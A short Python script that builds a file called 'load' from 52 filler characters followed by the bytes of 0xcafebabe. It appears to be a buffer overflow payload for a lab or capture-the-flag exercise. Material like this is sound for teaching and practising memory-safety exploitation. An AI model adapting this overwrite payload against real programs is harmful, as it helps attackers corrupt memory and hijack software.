c1 = "12345678901234567890123456789012"
c2 = "11112222333344445555"
c3 = "\xbe\xba\xfe\xca"

load = c1 + c2 + c3

with open('load', 'w') as load_file:
    load_file.write(load)
